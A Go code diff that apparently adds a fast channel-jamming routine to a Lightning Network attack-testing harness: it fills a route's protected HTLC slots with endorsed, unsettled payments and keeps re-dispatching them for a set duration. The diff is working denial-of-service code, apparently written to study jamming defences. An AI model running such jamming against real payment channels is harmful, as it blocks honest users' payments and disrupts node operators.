@@ -117,6 +117,159 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	return nil
 }
 
+// Dispatches a fast jamming attack against the protected slots, blocking until
+// the desired jamming duration has passed.
+func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
+	route *lndclient.QueryRoutesResponse, duration time.Duration) error {
+
+	var (
+		wg sync.WaitGroup
+
+		// dispatch is used to signal that we need to dispatch another
+		// fast jamming payment because one has just completed. We send
+		// the result of the jamming payment that's just completed on it
+		// so that we can take a look at what happened in our latest
+		// completed payment. Buffered so we don't have to wait for
+		// all payment results to be read.
+		dispatch = make(chan JammingPaymentResp)
+
+		// cancelAll is a high level signal to shut down all payments.
+		cancelAll = make(chan struct{})
+	)
+
+	// Closure that will launch a fast jamming payment.
+	launchFastJam := func() (<-chan JammingPaymentResp, error) {
+		req := JammingPaymentReq{
+			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
+			SourceIdx:       0,
+			DestIdx:         2,
+			EndorseOutgoing: true,
+			SettleWait:      time.Second * 60,
+			Settle:          false,
+			EarlySettle:     cancelAll,
+		}
+
+		resp, err := j.JammingPaymentRoute(ctx, req, *route)
+		if err != nil {
+			return nil, fmt.Errorf("fast jam: %v", err)
+		}
+
+		return resp, nil
+	}
+
+	// Closure that will consume the result of a fast jamming payment,
+	// sending a signal that we should dispatch another once it's completed.
+	watchFastJam := func(resp <-chan JammingPaymentResp) {
+		select {
+		// Always wait for payment to complete, unless we get a high
+		// level exit.
+		case r := <-resp:
+			select {
+			// Don't assume that we'll be able to send to the
+			// dispatch channel, if we're exiting we no longer
+			// care about receiving all of these results.
+			case dispatch <- r:
+			// If we're cancelling all payments, we can quit once
+			// we've got a result for this one (don't need to
+			// report it to the consumer).
+			case <-cancelAll:
+			case <-ctx.Done():
+			}
+
+		case <-ctx.Done():
+		}
+	}
+
+	// Launch an initial set of payments, watching each one individually.
+	for i := 0; i < 483/2; i++ {
+		rep, err := launchFastJam()
+		if err != nil {
+			log.Printf("Could not launch fast jam %v: %v", i, err)
+			break
+		}
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			watchFastJam(rep)
+		}()
+
+		// We pause a few seconds to give ourselves some time to process
+		// the payments as they cancel so that we can better
+		// res-dispatch replacements once this initial set resolves.
+		if i%50 == 0 && i != 0 {
+			log.Printf("Introducing delay between initial jams: %v", i)
+			select {
+			case <-time.After(time.Second * 5):
+
+			case <-ctx.Done():
+				return ctx.Err()
+			}
+		}
+	}
+
+	var (
+		totalSent = 483 / 2
+		loopErr   error
+
+		// Once we've launched our initial set of jams, start the timer
+		// for the duration of our attack. We want to only start from
+		// the point where we've filled the slots with our first set of
+		// payments.
+		start = time.Now()
+		end   = start.Add(duration)
+	)
+
+	log.Println("Dispatched initial set of protected fast jamming payments")
+
+	// Loop that will keep dispatching new jams until we hit an error or
+	// our desired attack duration ends.
+dispatchLoop:
+	for {
+		if time.Now().After(end) {
+			log.Printf("Reached end of jamming attack: %v", end)
+			break dispatchLoop
+		}
+
+		select {
+		case r := <-dispatch:
+			// If a payment failed, we shouldn't dispatch any more.
+			if r.Err != nil {
+				loopErr = r.Err
+				break dispatchLoop
+			}
+
+			// Launch another payment in a goroutine so that we can
+			// dispatch as many as we need.
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+
+				rep, err := launchFastJam()
+				if err != nil {
+					log.Printf("Could not launch fast jam: %v", err)
+				}
+
+				watchFastJam(rep)
+			}()
+
+			totalSent++
+			if totalSent%200 == 0 {
+				log.Printf("Dispatched: %v fast jams", totalSent)
+			}
+
+		case <-ctx.Done():
+			return ctx.Err()
+		}
+	}
+
+	close(cancelAll)
+
+	log.Println("Waiting for fast jams to complete")
+	wg.Wait()
+	return loopErr
+}
+
 // Dispatches slow jamming attack against protected slots, blocking until the
 // payments have completed (after the duration provided).
 func slowJamProtected(ctx context.Context, jammer *JammingHarness,
